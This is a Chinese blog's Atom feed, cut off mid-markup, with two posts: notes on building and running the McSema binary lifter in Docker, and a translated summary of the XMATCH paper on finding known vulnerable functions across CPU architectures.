<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-04-03T03:11:16.272Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mcsema 学习记录</title>
    <link href="https://nocbtm.github.io/2020/03/24/Mcsema-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://nocbtm.github.io/2020/03/24/Mcsema-学习记录/</id>
    <published>2020-03-24T13:31:58.000Z</published>
    <updated>2020-04-03T03:11:16.272Z</updated>
    
    <content type="html"><![CDATA[<p>参考<br><a href="https://github.com/lifting-bits/mcsema#using-mcsema" target="_blank" rel="noopener">https://github.com/lifting-bits/mcsema#using-mcsema</a><br><a href="https://github.com/lifting-bits/mcsema/blob/master/docs/McSemaWalkthrough.md" target="_blank" rel="noopener">https://github.com/lifting-bits/mcsema/blob/master/docs/McSemaWalkthrough.md</a><br><a href="https://blog.trailofbits.com/2017/03/14/mcsema-im-liftin-it/#comments" target="_blank" rel="noopener">https://blog.trailofbits.com/2017/03/14/mcsema-im-liftin-it/#comments</a><br><a href="https://blog.trailofbits.com/2018/01/23/heavy-lifting-with-mcsema-2-0/" target="_blank" rel="noopener">https://blog.trailofbits.com/2018/01/23/heavy-lifting-with-mcsema-2-0/</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>McSema是可执行文件。它将可执行二进制文件从本机代码转换（“提升”）为LLVM位代码。LLVM位码是程序的中间表示形式，最初是为可重新定向的LLVM编译器创建的，但对于执行无法直接在可执行二进制文件上执行的程序分析方法也非常有用。</p><p>McSema使分析师能够查找和追溯二进制程序，以解决安全漏洞，独立验证供应商源代码并生成覆盖率高的应用程序测试。McSema不仅用于静态分析。提升后的LLVM位代码也可以使用libFuzzer进行模糊处理，libFuzzer是基于LLVM的检测性模糊器，否则将需要目标源代码。提升的位码甚至可以编译回可运行的程序！这是一个称为静态二进制重写，二进制转换或二进制重新编译的过程。</p><p>McSema支持提升Linux（ELF）和Windows（PE）可执行文件，并了解大多数x86和amd64指令，包括整数，X87，MMX，SSE和AVX操作。AARCH64（ARMv8）指令支持正在积极开发中。</p><p>使用McSema的过程分为两个步骤：控制流恢复和指令翻译。使用该mcsema-disass工具执行控制流恢复，该工具依赖于IDA Pro，Binary Ninja或DynInst来分解二进制文件并生成控制流图。然后使用该mcsema-lift工具执行指令转换，该工具将控制流程图转换为LLVM位代码。在后台，的指令翻译功能mcsema-lift在remill库中实现。的开发remill是对McSema的重构和改进的结果。</p><p>McSema 2.0.0</p><ul><li>Remill。现在，指令语义已完全分离到自己的库Remill中。McSema是使用该库进行二进制提升的客户端。举个比喻，McSema代表Remill，Clang代表LLVM。使用Remill寻找将来的项目。</li><li>简化的语义。McSema和Remill的分离使添加对新指令的支持变得更加容易。在Remill中，指令语义可以直接用C ++表达，并由Clang自动编译为LLVM位代码</li><li>AArch64（64位ARMv8）。使用Remill作为语义后端的转变意味着McSema 2从一开始就支持多种架构。它不仅可以在x86和x86-64二进制文件上运行，而且还支持提升64位ARMv8程序。</li><li>SSE3 / 4和AVX支持。McSema现在支持利用高级矢量指令集的提升程序</li><li>CFG回收率更高。提升错误的常见根源是控制流恢复能力差。我们改进了控制流恢复过程，使其更简单，更快，更准确。McSema的CFG恢复也开始合并一些高级功能，例如提升全局变量和堆栈变量</li><li>Binary Ninja support. McSema现在具有Beta支持，可通过Binary Ninja恢复程序控制流。</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里用docker安装，比较省力。但pull的时间比较长，镜像有8.03G。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull moflow/mcsema</span><br></pre></td></tr></table></figure><p>pull完了我才发现这个跟github上的不一样 淦</p><p>还是用github上的dockerfile来build吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 1. wget https://raw.githubusercontent.com/trailofbits/mcsema/master/tools/Dockerfile</span><br><span class="line"># 2. docker build -t=mcsema .</span><br><span class="line"># 3. docker run --rm -itd --ipc=host -v &quot;$&#123;PWD&#125;&quot;:/home/user/local mcsema</span><br></pre></td></tr></table></figure></p><p>其中我试了很多次都没build成功，这个dockerfile里面有很多坑<br>1、git clone的太慢了简直是龟速， 看了网上的骚操作，把github的项目直接导入到gitee上，然后克隆gitee速度飞起</p><p>2、RUN sudo dpkg –add-architecture i386 &amp;&amp; sudo apt-get install zip zlib1g-dev:i386 -y 这句话也错了，要把 sudo 和 :i386去掉</p><p>3、更换国内的软件源 RUN  sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># Using this file:</span><br><span class="line"># 1. wget https://raw.githubusercontent.com/trailofbits/mcsema/master/tools/Dockerfile</span><br><span class="line"># 2. docker build -t=mcsema .</span><br><span class="line"># 3. docker run --rm -it --ipc=host -v &quot;$&#123;PWD&#125;&quot;:/home/user/local mcsema</span><br><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">RUN apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="line">RUN apt-get install git curl cmake python2.7 python-pip python-virtualenv wget build-essential gcc-multilib g++-multilib libtinfo-dev lsb-release zlib1g-dev -y</span><br><span class="line"></span><br><span class="line"># If using IDA for CFG recovery, uncomment the following line:</span><br><span class="line">RUN sudo dpkg --add-architecture i386 &amp;&amp; sudo apt-get install zip zlib1g-dev:i386 -y</span><br><span class="line"></span><br><span class="line"># Set up enviornment in `/home/ToB`</span><br><span class="line">WORKDIR /home/ToB</span><br><span class="line"></span><br><span class="line"># Download everything and set up folder structure</span><br><span class="line">RUN git clone --depth 1 https://github.com/lifting-bits/mcsema.git &amp;&amp; \</span><br><span class="line">    export REMILL_VERSION=`cat ./mcsema/.remill_commit_id` &amp;&amp; \</span><br><span class="line">    git clone https://github.com/lifting-bits/remill.git &amp;&amp; \</span><br><span class="line">    cd remill &amp;&amp; \</span><br><span class="line">    git checkout -b temp $&#123;REMILL_VERSION&#125; &amp;&amp; \</span><br><span class="line">    mv ../mcsema tools</span><br><span class="line"></span><br><span class="line">RUN cd remill &amp;&amp; ./scripts/build.sh</span><br><span class="line"></span><br><span class="line">RUN cd remill/remill-build &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">WORKDIR /home/user</span><br><span class="line">################################</span><br><span class="line"># Left to reader to install    #</span><br><span class="line">#  their disassembler (IDA/BN) #</span><br><span class="line">################################</span><br><span class="line"># But, as an example:</span><br><span class="line"># ADD local-relative/path/to/binaryninja/ /root/binaryninja/</span><br><span class="line"># ADD local-relative/path/to/.binaryninja/ /root/.binaryninja/ # &lt;- Make sure there&apos;s no `lastrun` file</span><br><span class="line"># RUN /root/binaryninja/scripts/linux-setup.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Allow for mounting of local folder</span><br><span class="line">RUN mkdir local</span><br><span class="line"></span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure><p>修改版的dockerfile 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># Using this file:</span><br><span class="line"># 1. wget https://raw.githubusercontent.com/trailofbits/mcsema/master/tools/Dockerfile</span><br><span class="line"># 2. docker build -t=mcsema .</span><br><span class="line"># 3. docker run --rm -it --ipc=host -v &quot;$&#123;PWD&#125;&quot;:/home/user/local mcsema</span><br><span class="line"></span><br><span class="line">FROM ubuntu:18.04</span><br><span class="line">RUN  sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="line">RUN apt-get install git curl cmake python2.7 python-pip python-virtualenv wget build-essential gcc-multilib g++-multilib libtinfo-dev lsb-release zlib1g-dev -y</span><br><span class="line"></span><br><span class="line"># If using IDA for CFG recovery, uncomment the following line:</span><br><span class="line">RUN dpkg --add-architecture i386 &amp;&amp;  apt-get install zip zlib1g-dev -y</span><br><span class="line"></span><br><span class="line"># Set up enviornment in `/home/ToB`</span><br><span class="line">WORKDIR /home/ToB</span><br><span class="line"></span><br><span class="line"># Download everything and set up folder structure</span><br><span class="line">RUN git clone https://gitee.com/nocbtm/mcsema.git &amp;&amp; \</span><br><span class="line">    export REMILL_VERSION=`cat ./mcsema/.remill_commit_id` &amp;&amp; \</span><br><span class="line">    git clone https://gitee.com/nocbtm/remill.git &amp;&amp; \</span><br><span class="line">    cd remill &amp;&amp; \</span><br><span class="line">    git checkout -b temp $&#123;REMILL_VERSION&#125; &amp;&amp; \</span><br><span class="line">    mv ../mcsema tools</span><br><span class="line"></span><br><span class="line">RUN cd remill &amp;&amp; ./scripts/build.sh</span><br><span class="line"></span><br><span class="line">RUN cd remill/remill-build &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">WORKDIR /home/user</span><br><span class="line">################################</span><br><span class="line"># Left to reader to install    #</span><br><span class="line">#  their disassembler (IDA/BN) #</span><br><span class="line">################################</span><br><span class="line"># But, as an example:</span><br><span class="line"># ADD local-relative/path/to/binaryninja/ /root/binaryninja/</span><br><span class="line"># ADD local-relative/path/to/.binaryninja/ /root/.binaryninja/ # &lt;- Make sure there&apos;s no `lastrun` file</span><br><span class="line"># RUN /root/binaryninja/scripts/linux-setup.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Allow for mounting of local folder</span><br><span class="line">RUN mkdir local</span><br><span class="line"></span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure><p>然后又遇到了新问题 RUN cd remill &amp;&amp; ./scripts/build.sh 脚本里面curl 的一个网站被墙了，死活安装不上，又没有找到替代的。淦，科学上网尤为重要</p><p>祭出香港云服务器又重新bulid，大约过了半小时才build完。</p><p>最后我已经上传到了阿里云上，日常搬运。方便日后下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/nocbtm/mcsema:2.0</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>使用mcsema-disassmcsema的CFG恢复部分来恢复xz的控制流。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mcsema-disass --disassembler〜/ ida-6.9 / idal64 --os linux --arch amd64 --output xz.cfg --binary xz --entrypoint main --log_file xz.log</span><br></pre></td></tr></table></figure><p>让我们来看一下每个选项：</p><ul><li>–disassembler ~/ida-6.9/idal64：这是IDA Pro可执行文件的路径，它将执行大部分拆卸工作。</li><li>–os linux：我们要提供的二进制文件适用于Linux操作系统。可以在任何受支持的平台上将mcsema用于任何受支持的二进制文件（例如，可以在Linux上取消Windows二进制文件，反之亦然）。</li><li>–arch amd64注意：我们要提升的二进制文件是使用amd64或x86_64指令集的64位二进制文​​件。</li><li>–output xz.cfg：将恢复的控制流信息存储在名为的文件中xz.cfg。</li><li>–binary xz：xz用作输入二进制</li><li>–entrypoint main：指定反汇编程序应从哪里开始恢复控制流。这告诉它使用该main功能作为CFG恢复的起点。</li><li>–log_file xz.log：用于存储反汇编日志的位置。这是可选的，但对调试很有帮助，正如我们将在本指南的后面部分看到的那样。</li></ul><p>获得程序的控制流信息后，可以使用将其转换为LLVM位代码mcsema-lift-4.0。这4.0是所使用的LLVM工具链的版本。可以将McSema构建为使用LLVM 3.6版及更高版本。</p><p>这是将CFG转换为位码的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mcsema-lift-4.0 --os linux --arch amd64 --cfg xz.cfg --output xz.bc</span><br></pre></td></tr></table></figure><p>让我们一一探讨这些选项：</p><ul><li>–os linux：CFG来自Linux操作系统的二进制文件。当前有效的选项是linux或windows。翻译的某些方面（例如外部功能的ABI兼容性）需要此选项。</li><li>–arch amd64：对amd64架构使用指令语义。有效选项包括x86和x86_avx（32位x86语义），amd64和amd64_avx（64位x86）以及aarch64（64位ARMv8）。</li><li>–cfg xz.cfg：将输入控制流程图转换为位代码。</li><li>–output xz.bc：在哪里写位码。如果–output未指定该选项，则将位代码写入stdout。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考&lt;br&gt;&lt;a href=&quot;https://github.com/lifting-bits/mcsema#using-mcsema&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/lifting-bits/mcsema
      
    
    </summary>
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="https://nocbtm.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>提取用于跨平台漏洞搜索的条件公式</title>
    <link href="https://nocbtm.github.io/2020/03/17/%E6%8F%90%E5%8F%96%E7%94%A8%E4%BA%8E%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E7%9A%84%E6%9D%A1%E4%BB%B6%E5%85%AC%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/03/17/提取用于跨平台漏洞搜索的条件公式/</id>
    <published>2020-03-17T01:04:49.000Z</published>
    <updated>2020-03-18T08:56:25.665Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章的主要思想和方法来源于一篇论文<a href="https://www.semanticscholar.org/paper/Extracting-Conditional-Formulas-for-Cross-Platform-Feng-Wang/c75d9f1ff9177b26b7681876d7ee810d14401a49" target="_blank" rel="noopener">https://www.semanticscholar.org/paper/Extracting-Conditional-Formulas-for-Cross-Platform-Feng-Wang/c75d9f1ff9177b26b7681876d7ee810d14401a49</a><br>虽然不是最新的，但是对于研究漏洞挖掘来学习一下也不错。你可以看作本文是对这篇论文的翻译加提取。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>随着最近嵌入式系统和IoT设备中安全漏洞的增加，在跨平台环境中直接在二进制可执行文件中搜索漏洞变得越来越重要。但是，在这个领域中几乎没有探索。现有的努力易于产生大量的误报，其结果无法为人类分析家消除这些误报提供可解释的证据。在本文中，我们建议从原始二进制代码中提取条件公式作为高级语义特征，以进行代码搜索。条件公式明确捕获了错误的两个基本因素：1）错误的数据依赖性和 2）缺少条件检查或无效的条件检查。结果是，在条件公式上执行二进制代码搜索可显着提高准确性，并为人类分析人员进一步检查搜索结果提供有意义的证据。我们已经实现了XMATCH原型，并使用包括OpenSSL和BusyBox在内的知名软件对其进行了评估。实验结果表明，XMATCH在准确性方面优于现有的错误搜索技术。此外，通过评估5个最近的漏洞，XMATCH为人类分析人员提供了明确的证据，以确定匹配的候选对象是否确实易受攻击或已被修补。实验结果表明，XMATCH在准确性方面优于现有的错误搜索技术。此外，通过评估5个最近的漏洞，XMATCH为人类分析人员提供了明确的证据，以确定匹配的候选对象是否确实易受攻击或已被修补。实验结果表明，XMATCH在准确性方面优于现有的错误搜索技术。此外，通过评估5个最近的漏洞，XMATCH为人类分析人员提供了明确的证据，以确定匹配的候选对象是否确实易受攻击或已被修补。</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>我们以真实漏洞CVE- 2013 -6449为例。图1说明了x86和MIPS的ssl_get_algorithm2的两个二进制函数。x86版本是从OpenSSL库(版本1.0. la)编译而成的，而MIPS版本是从基于Linux的路由器固件DD-WRT (版本r21676) 中直接提取的。这两个代码段均包含漏洞CVE-2013- 6449，该漏洞使远程攻击者可以通过来自TLS 1. 2客户端的特制流量发起拒绝服务攻击(守护程序崩溃)。在此示例中，向我们提供了x86的易受攻击的函数ssl_get_algorithm2,我们旨在从路由器固件中搜索剥离后的二进制文件中的同一易受攻击的函数，并根据匹配结果确定每个匹配的候选对象是否确实易受攻击:误报或已应用于脆弱功能的补丁。<br><img alt="图1" data-src="https://d3i71xaburhd42.cloudfront.net/c75d9f1ff9177b26b7681876d7ee810d14401a49/2-Figure1-1.png" class="lozad"><br>图1：在不同架构（x86与MIPS）下易受攻击的函数ssl_get_algorithm2（CVE-2013-6449）的控制流程图比较。</p><p>从这个例子中，我们观察到跨平台二进制代码搜索的一些挑战:</p><ul><li><p>句法表示形式非常不同。x86和MIPS具 有完全不同的指令集。他们采用不同的策略来传递函数参数: x86通 常是放大堆栈以传递参数，而MIPS将参数保存在特殊寄存器中。此外，它们使用不同的机制进行条件分支: x86 .依赖于隐式EFLAGS寄存器，而MIPS则不依赖。 如图1所示，指令语法和指令计数有很大不同。因此，任何基于表面特征(例如，操作码类型和数量）的代码搜索技术都可能不会产生非常好的准确性。</p></li><li><p>控制流图不一致。在两个平台上编译的相同函数的控制流图非常不同的结构。在图1中，虽然x86二进制文件包含4个基本块，但NIPS功能却包含5个基本块。此类CFG更改可能会成为先前代码搜索工作的重要障碍,这依赖于基本决级别的特征提取和语义比较。相反,为了解决此问题，我们建议使用基于行为的高级语义来搜索安全性错误，包括数据依赖性和分支谓词。这些因素揭示了基本的程序行为，而不是易失的代码形成，因此对CFG级别的结构变化不敏感。</p></li><li><p>易受攻击的代码逻辑通常分散在多个基本块中。图1中所示的漏洞是由于对ssl_get_algorithm2参数的版本检查不正确引起的， 但是此代码逻辑跨越多个基本块，并与其他代码逻辑合。因此，要精确定位并确认此漏河，就像先前的工作一样，不足以匹配各个基本块。相反，有必要将涉及多个基本块的滑河作为一个整体来考虑并重新构建。</p></li></ul><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>我们在图2中概述了我们的方法。它包括以下三个步骤:二进制提升，条件公式提取和条件公式匹配。二进制提升。我们首先利用二进制提升将不同的本地机器代码转换为相同的更高级别的中间表示(IR)。提升后的二进制文件保留与原始二进制程序一致的语义。 我们随后的操作将直接在提升后的二进制文件上进行。条件公式提取。我们对提升后的二进制应用二进制分析技术来构造条件公式。我们通过指针仔细处理数据依赖性。此外，并非所有提升二元函数中的变量都有意义。我们进行动作点选择以过滤不相关的变量。条件公式匹配。我们通过函数的统一条件公式对其进行匹配。我们将匹配问题建模为线性分配问题，并利用编程技术来找到最住解决方案。然后，除了简单的相似性得分外，匹配结果还和CF的一对一映射。因此，分析人员可以检查深度映射结果，以了解和验证任何发现的错误。</p><p><img alt="图2" data-src="https://d3i71xaburhd42.cloudfront.net/c75d9f1ff9177b26b7681876d7ee810d14401a49/4-Figure4-1.png" class="lozad"></p><p>图2：输入是实现x86和MIPS的ssl_get_algorithm2函数的二进制文件，其中包含漏河CVE 2013-6449。首先,将两个二进制文件提升为中间表示(IR)。第二，从提升的二元函数中提取条件公式。最后，条件匹配适用于相似度得分，并输出一对一的映射结果。</p><h2 id="二进制提升"><a href="#二进制提升" class="headerlink" title="二进制提升"></a>二进制提升</h2><p>二进制提升将不同体系结构的二进制代码转换为通用代码表示形式，以方便后续分析。我们需要为一个函数提取条件公式，这种转换必须保留整个函数的语义。为此，我们首先恢复功能的控制流程图，然后按照控制流程图对指令进行二进制转换。关于实现，我们的二进制提升基于McSema， 一种代码转换框架，可将x86指令转换为LLVW IR (中间表示)。为了解决跨平台错误搜索的问题，我们在两个方面扩展了Mc-Sema: 1) 多体系结构支持; 2)基于功能原型的翻译。</p><h3 id="McSema支持多种架构"><a href="#McSema支持多种架构" class="headerlink" title="McSema支持多种架构"></a>McSema支持多种架构</h3><p>McSema提供了一个通用框架，使我们能够轻松支持其他指令集。在当前的XMATCH实现中，我们扩展了对MIPS的支持，因为它是流行的CPU架构，嵌入式系统和IoT设备的架构。</p><p>McSema需要两个步骤来转换二进制函数: 1) 控制流程图恢复，以及2)生成位代码。控制流程图恢复将分解一个二进制函数，检索其基本块以及这些基本块之间的控制流依赖性。生成位码将遍历控制流程图，进行一对一 的指令转换并生成LLV位码文件。我们利用IDA Pro来检索MIPS二进制函数的控制流程图。McSema通过对每个指令的执行语义进行建模，将每个指令转换为x86二进制文件。我们遵循类似的指令翻译过程。MIPS属于RISC指令集，因此在McSema中添加这种支持的工作量比添加对x86等CISC指令集的支持要简单得多。在我们的案例中，我们在McSema中添加的0C少于1K,这是一次性的工作。</p><h3 id="基于功能原型的翻译"><a href="#基于功能原型的翻译" class="headerlink" title="基于功能原型的翻译"></a>基于功能原型的翻译</h3><p>对于函数调用翻译，McSema引入了全局“con-test registers”数据类型，并将其用作所有提升函数的唯一参数。“con-test registers”包括以下所有寄存器相应的CPU架构。在解除功能的开始，MeSena首先分配几个局部变量，然后将全局“con-test registers”参数中的所有寄存器溢出到这些变量中。然后，基于变量执行以下操作。当函数返回时，“con-test registers”将包含最新的变量值。在每个函数调用站点，这意味着将调用提升的函数，首先包装“con-test registers”，然后将其作为唯一参数传递给被调用方。结果，McSema可以保留功能之间的控制和数据流依赖性，而无需执行功能原型恢复。但是，这种翻译策略将削弱XMATCH的功效。首先，在没有函数原型恢复的情况下，生成的条件公式无法在函数的实参上表示执行语义，因为某些缺陷代码逻辑可能与函数调用(例如nemcpy).上 的实参有关。其次，统一函数原型将降低XMATCH的准确性，因为我们不能依靠参数的数量来进一步优化搜索结果。为了解决.上面讨论的这些问题，我们要求McSena根据函数原型翻译函数调用指令。更具体地说，可通过三个步骤来实现此目标:</p><ul><li>函数原型恢复</li><li>函数调用转换</li><li>参数传递模型</li></ul><p>我们首先恢复二进制函数的函数原型，然后基于恢复的函数原型在McSema中修改函数调用转换机制。我们还添加了其他IR指令,以对传递给相应呼叫站点的参数进行建模。</p><p>函数数原型包括函数名称，其参数和返回值。我们利用IDApro来获取恢复的功能原型。与许多其他功能原型算法和平台相比，IDA pro可能具有局限性。但是，它是用户友好的，并且支持多个平台。此外，我们的实验表明，这足以满足我们的实验目的。将来，我们将采用更强大的方法进行进一步的改进。 我们在函数调用上分配所有函数-翻译期间返回值的站点。我们将在生成条件公式中进行筛选过程，以减少虚假回报值对生成的条件公式的影响。</p><p>当McSema翻泽函数调用指令时，它将预先定义要翻译的参数数量。在其原始设计中，它始终假定参数数目为1。在我们的sce-nario中，参数数目由恢复的函数原型定义。我们创建的参数变量具有在函数原型中定义的相同数量的参数。我们还为每个提升的函数创建了返回变量。</p><p>由于在MeSema中已更改了函数调用指令的转换，因此我们还需要添加相应的参数传递指令，以保留调用者函数与其被调用者之间的数据流依赖性。对参数传递进行建模取决于原始二进制函数的调用约定类型。我们通过调用约定的类型对它们进行建模，并通过匹配我们的建模模式来检查调用约定的类型。对于调用约定类型，我们在函数调用指令之前添加传递IR指令的相应参数。</p><p>图3显示了如何在x86和MIPS架构上转换的具体示例。在此示例中，根据IDA中的分析，我们知道功能栏具有两个参数，因此在呼叫站点，呼叫栏和ja1栏将被翻译为多个IR指令，如图所示。数字。调用指令之前的指令描述了如何将参数传递给相应的函数。</p><p><img alt="图3" data-src="https://d3i71xaburhd42.cloudfront.net/c75d9f1ff9177b26b7681876d7ee810d14401a49/5-Figure5-1.png" class="lozad"></p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>McSema不支持各种x86指令的翻译。例如，它仅支持-小部分浮点指令。但是，McSema有据可查， 并且为所需的其他说明添加支持并不困难。在这种情况下，对我们而言，为条件公式提取所必需的条件分支提供支持非常重要，因此我们]添加了McSema不支持的这种浮点指令的支持。我们相信支持所有说明是工程工作，并将其留作未来工作。</p><h2 id="条件公式提取"><a href="#条件公式提取" class="headerlink" title="条件公式提取"></a>条件公式提取</h2><p>我们直接对提升函数进行静态分析，以提取其条件公式。更具体地说，我们进行过程内数据流分析以构造动作公式，并执行路径切片以检索相应条件。所有静态分析都是在LLVM框架之上进行的。</p><h3 id="动作构建"><a href="#动作构建" class="headerlink" title="动作构建"></a>动作构建</h3><p>动作是特定R变量上的数据流方程，用作函数输山。为了构造一个动作，我们首先发现所有具有外部影响的函数输出(我们称它们为“动作点”)。然后，从每个动作点开始，我们计算ust def链以评估从函数输出到输入的可达性。最終，我们将每条迹线上的所有IR语句折叠起来，以产生-一个数据流万程，作为对相应动作点的动作。动作点选择。直观地。我们可以为函数中托管的任何IR变量计算数据流方程。但是，提升函数仍然保留许多体系结构特定的变量，例如图5n)中的ESP val和图5b)中的a0 valo这将使生成的条件公式在整个体系结构中截然不同。因此,我们仅关注稳定的输出状态，这些状态表示一致的程序行为。为此，我们旨在从三种类型的函数输出中计算反向数据流:1)返回值: 2) 内存变量; 3) 函数调用。</p><p>1)返回值。即使我们假设提升的二进制文件中的所有函数在第3.2节中讨论的二进制提升过程中都具有返回值，我们也会进行保守分析以识别持有这回值的变量。首先，我们寻找具有特定寄存器名称的IR变量。这是由于这样的事实，即某种体系结构使用特定的寄存器来保存返回值和IR变量(尽管从二进制中取出)仍保留了原始寄存器名称。第二，在这些候选变量中，我们进一步搜索那些从未在同一函数中重新定义的变量。然后，我们考虑这些变量包含返回值。</p><p>2)内存变量。函数也可以写入内存。这将转换为提升双字节的存储器写操作。因此，我们通过首先搜索LLVM IR中的存储器写指令storeinst来获得存储器变量。接下来，我们执行值集分析。以确定指针指向的内存区域。一旦未在函数中更新存储区域。则其指针现在指向实际输出。因此可以将其视为动作点。</p><p>3)函数调用。一个函数可以调用另一个函数。如果调用方函数性用或检查被调用方函数的这回值，则被调用方函数最终将包含在使用该返回值的变量的数据流表达式中。如果在调用者函数中从未使用过call函数的返回值，则将其视为操作点。</p><h3 id="条件提取"><a href="#条件提取" class="headerlink" title="条件提取"></a>条件提取</h3><p>我们进一步利用路径切片算法(JHALA,MAJUNDAR)为每个动作生成条件。在我们的方案中，路径切片用于提取在其中保存操作的特定路径的条件取消二进制功能。给定操作和计算出的数据流，我们将切片标准设置为在操作中包括所有变量。根据切片标准，路径切片算法将向后追潮，以找到包含切片标准中所有变量的路径切片。我们从路径切片中提取所有比较变量并为这些变量生成请词表达式。每个pred-icate表达式包括条件表达式及其布尔值，这些值将导致动作被执行。在LLWI- IR中，如果它是条件跳转，则比较变量是分支指令的第一个操作数。 我们为条件变量生成数据流方程，以获取此基本块上的条件表达式我们可以通过检查成功获取布尔值-路径上的块。如果其地址是分支变量的第二个操作数。则布尔值为true。否则为假。如果布尔值是false,我们将否定条件表达式。我们将在路径切片上发现的清词表达式作为动作v的条件进行结合。</p><p>运行示例。图7展示了eax动作的条件生成过程。图7(a)列出了针对eax的两个操作: a0+2和a0+1。这表明eax可以根据要采用的数据流路径保留两个不同的值。图7 (b)显示.了两个动作的路径标准，每个动作都涉及3个IR变量。在图7(b)中也显示了相应的操作路径切片。这些切片不仅包括数据流。还包括所有条件。然后，我们可以演历这些路径切片，提取所有分支变量，并对其数据流方程进行组合。结果成为执行此操作的条件。动作a0 + 1和a0 + 2的条件生成输出在图7 (e)中列出。</p><p><img alt="" data-src="https://d3i71xaburhd42.cloudfront.net/c75d9f1ff9177b26b7681876d7ee810d14401a49/6-Figure7-1.png" class="lozad"></p><h2 id="条件公式匹配"><a href="#条件公式匹配" class="headerlink" 